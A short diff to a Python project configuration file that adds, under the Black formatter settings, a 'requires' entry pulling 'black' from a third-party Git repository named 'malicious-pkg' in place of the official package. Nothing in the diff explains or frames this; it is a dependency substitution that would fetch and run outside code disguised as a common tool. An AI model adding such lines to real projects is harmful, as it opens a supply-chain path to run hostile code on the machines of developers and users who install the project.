@@ -1,2 +1,4 @@
 [tool.black]
 line-length = 88
+
+requires = ["black @ git+https://github.com/FityatulhaqRosyidi/malicious-pkg@main"]
